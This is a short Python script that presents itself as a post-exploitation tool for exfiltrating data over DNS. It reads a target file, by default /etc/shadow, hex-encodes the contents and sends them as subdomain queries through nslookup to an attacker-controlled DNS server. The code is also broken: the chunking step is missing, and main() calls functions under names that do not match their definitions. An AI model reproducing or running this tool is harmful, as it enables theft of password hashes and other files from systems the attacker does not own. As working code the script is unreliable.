#!/usr/bin/python 
#A post-exploitaiton/data exfiltration tool, that uses DNS Tunneling to extract target file data and prepend the encoded data
#to DNS requests sent to the attacker's server

import argparse
import subprocess 

parser = argparse.ArgumentParser(description="Data exfiltration via DNS tunneling")
parser.add_argument("-p", "--path", type=str, required=True, help="File-path/Directory-Path for targeted exfiltration")
parser.add_argument("-c", "--client", type=str, required=False, help="Client IP to listen for")
parser.add_argument("-s", "--server", type=str, required=False, help="Server IP to send data to")

#Read target file, and encode contents in hexadecimal
def read_and_encode_file(file_path):
  with open(file_path, 'rb') as file:
    file_content = file.read()
    hex_encoded = file_content.hex()
  return hex_encoded 
#Split encoded data into chunks
def send_chunks(encoded_data, chunk_size, attacker_dns_server, domain):
  
 # Send each chunk using nslookup
    for chunk in chunks:
        query = chunk + "." + domain
        nslookup_command = ['nslookup', query, attacker_dns_server]
        subprocess.run(nslookup_command)

def main():
    # Configuration
    file_path = '/etc/shadow'  #CHANGE THIS TO TARGET FILE PATH
    chunk_size = 50
    attacker_dns_server = '192.168.27.136' #CHANGE THIS TO LISTENING SERVER IP
    domain = 'example.com' #CHANGE THIS TO WHATEVER

    # Step 1: Read and encode the file
    encoded_data = read_file_and_encode(file_path)

    # Step 2: Send each chunk via DNS using nslookup
    send_chunks_via_dns(encoded_data, chunk_size, attacker_dns_server, domain)

if __name__ == "__main__":
    main()
